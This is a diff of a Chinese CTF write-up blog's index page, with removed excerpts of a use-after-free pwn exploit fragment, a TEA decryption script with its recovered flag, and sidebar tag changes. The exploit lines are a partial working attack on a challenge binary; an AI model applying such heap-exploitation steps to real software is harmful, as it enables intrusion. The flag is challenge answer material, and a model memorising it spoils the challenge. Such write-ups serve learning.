edit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(proc, gdbscript=gscript)</span></span><br><span class="line"></span><br><span class="line">NICO_addr = <span class="number">0x08048642</span></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">add()</span><br><span class="line">edt(<span class="number">1</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(NICO_addr))</span><br><span class="line">shw(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/06/19/NISACTF2022-uaf-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/17/GDOUCTF2023-tea-wp/" >GDOUCTF2023-tea-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-17
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp">相关资源</a></p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><ul>
-<li>Shift+F12 查看字符串，追寻到 “you are right.”的使用处， 发现核心处理代码</li>
-</ul>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x1.png?raw=true" alt="img">   </p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x2.png?raw=true" alt="img">   </p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x3.png?raw=true" alt="img">    </p>
-<ul>
-<li><p>进入查看发现35行 <code>sub_140011339</code>  将key置为[2233,4455,6677,8899]</p>
-</li>
-<li><p>36行 <code>sub_140011145</code> 将input复制到v9， 无用</p>
-</li>
-<li><p>37行 <code>sub_1400112B7</code> 利用input和key执行核心加密算法，且可逆向</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x4.png?raw=true" alt="img">    </p>
-</li>
-<li><p>38行 <code>sub_140011352</code> 检查结果</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x5.png?raw=true" alt="img"></p>
-</li>
-</ul>
-<h2 id="0x2-逆向脚本"><a href="#0x2-逆向脚本" class="headerlink" title="0x2 逆向脚本"></a>0x2 逆向脚本</h2><p>逆写算法就可以，注意循环下标也要逆序</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> a1[]= &#123;<span class="number">0x1A800BDA</span>, <span class="number">0xF7A6219B</span>, <span class="number">0x491811D8</span>, <span class="number">0xF2013328</span>, <span class="number">0x156C365B</span>, <span class="number">0x3C6EAAD8</span>, <span class="number">0x84D4BF28</span>, <span class="number">0xF11A7EE7</span>, <span class="number">0x3313B252</span>, <span class="number">0xDD9FE279</span> &#125;;</span><br><span class="line">	<span class="type">int</span> a2[]=&#123;<span class="number">2233</span>,<span class="number">4455</span>,<span class="number">6677</span>,<span class="number">8899</span>&#125;;</span><br><span class="line">	<span class="type">int</span> v3,v5,v6;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &gt;= <span class="number">0</span>; i-- ) &#123;</span><br><span class="line">		v5 = <span class="number">0</span>;</span><br><span class="line">		v6 = <span class="number">256256256</span> * i;</span><br><span class="line">		v3 = i + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;=<span class="number">0x20</span>; j++) &#123;</span><br><span class="line">			v6+=<span class="number">256256256</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			++v5;</span><br><span class="line">			v6 -= <span class="number">256256256</span>;</span><br><span class="line">			a1[v3] -= (v6 + a2[(v6 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (a1[i] + ((a1[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a1[i])));</span><br><span class="line">			a1[i] -= v6 ^ (a1[v3] + ((a1[v3] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * a1[v3]))) ^ (v6 + a2[v6 &amp; <span class="number">3</span>]);</span><br><span class="line">		&#125; <span class="keyword">while</span> ( v5 &lt;= <span class="number">0x20</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%#x &quot;</span>,a1[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/17/GDOUCTF2023-tea-wp/0x6.png?raw=true" alt="img">    </p>
-<p>HZCTF{hzCtf_94_re666fingcry5641qq}</p>
-
-	
-	</div>
-  <a type="button" href="/2023/06/17/GDOUCTF2023-tea-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/15/zer0pts2020-easystrcmp-wp/" >zer0pts2020-easystrcmp-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-15
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/15/zer0pts2020-easystrcmp-wp">相关资源</a>  </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/15/zer0pts2020-easystrcmp-wp/0x1.jpg?raw=true" alt="img">  </p>
-
-	
-	</div>
-  <a type="button" href="/2023/06/15/zer0pts2020-easystrcmp-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -567,9 +564,9 @@ else show_source(__FILE__);
 		
 			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
 		
-			<li><a href="/categories/web-learning/">web-learning<span>4</span></a></li>
+			<li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>45</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>47</span></a></li>
 		
 		</ul>
 	</div>
@@ -580,45 +577,45 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/nssctf/">nssctf<span>50</span></a></li>
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
 		
-			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+			<li><a href="/tags/HCTF2018/">HCTF2018<span>1</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>4</span></a></li>
-		
-			<li><a href="/tags/path-traversal/">path_traversal<span>1</span></a></li>
-		
-			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
-		
-			<li><a href="/tags/js/">js<span>1</span></a></li>
-		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
-		
-			<li><a href="/tags/CISCN2019/">CISCN2019<span>1</span></a></li>
-		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/file-include/">file_include<span>5</span></a></li>
+			<li><a href="/tags/got/">got<span>3</span></a></li>
 		
 			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
 		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
-		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
-		
 			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
+			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
 		
-			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
 		
-			<li><a href="/tags/md5/">md5<span>1</span></a></li>
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
 		
 			<li><a href="/tags/index/">index<span>1</span></a></li>
 		
+			<li><a href="/tags/web/">web<span>52</span></a></li>
+		
+			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
+		
+			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
+		
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/rce/">rce<span>16</span></a></li>
+		
+			<li><a href="/tags/create-function/">create_function<span>2</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+		
+			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
+		
 			<li><a href="/tags/sigsegv/">sigsegv<span>1</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>105</span></a></li>
@@ -634,23 +631,23 @@ else show_source(__FILE__);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/10/20/ssti/" ><i class="fa fa-file-o"></i>SSTI模板注入</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/17/GDOUCTF2023-ezze-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-&lt;ez_ze&gt;-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/16/axb2020-NormalSSTI-wp/" ><i class="fa fa-file-o"></i>安洵杯2020 Normal SSTI-wp</a>
+      </li>
+    
+      <li>
         <a href="/2023/10/14/seccon2019-sum-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.3.seccon2019-...</a>
       </li>
     
       <li>
         <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/10/dcquals2019-speedrun-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.1.dcquals2019...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/10/极客大挑战2020-rceme-wp/" ><i class="fa fa-file-o"></i>极客大挑战2020-rceme-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/07/UUCTF2022-ezrce-wp/" ><i class="fa fa-file-o"></i>UUCTF2022-ezrce-wp</a>
       </li>
     
   </ul>
